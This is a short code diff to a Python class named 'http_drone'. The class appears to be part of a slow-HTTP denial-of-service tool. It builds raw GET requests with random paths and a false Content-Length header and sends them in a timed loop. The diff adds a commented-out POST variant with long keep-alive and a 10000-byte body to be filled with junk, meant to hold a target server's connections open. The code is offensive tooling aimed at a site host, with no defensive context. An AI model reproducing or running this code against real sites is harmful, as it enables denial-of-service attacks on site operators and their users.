@@ -81,8 +81,13 @@ class http_drone:
 
         x = random.randint(10000, 100000)
 
+# The "payload" here is the GET payload...
         payload = 'GET /' + str(x) + ' HTTP/1.1\r\nHost: ' + siteHost + '\r\n' + 'User-Agent: ' + userAgent + '\r\n' + 'Content-Length: 36\r\n'
         fs = self.sckt.makefile()
+        
+        #payloadPOST
+        #payload = 'POST ' + targetpage + targetvar + str(x) + ' HTTP/1.1\r\nHost: ' + siteHost + ' \r\n' + 'User-Agent: ' + userAgent + '\r\n' + 'Connection: keep-alive\r\n' + 'Keep-Alive: 900\r\n' + 'Content-Length: 10000\r\n' + 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
+        # In this case X is just a SHITLOAD of junk. About 10000 random bits of shit
 
         while 1:
             time.sleep(2.7)
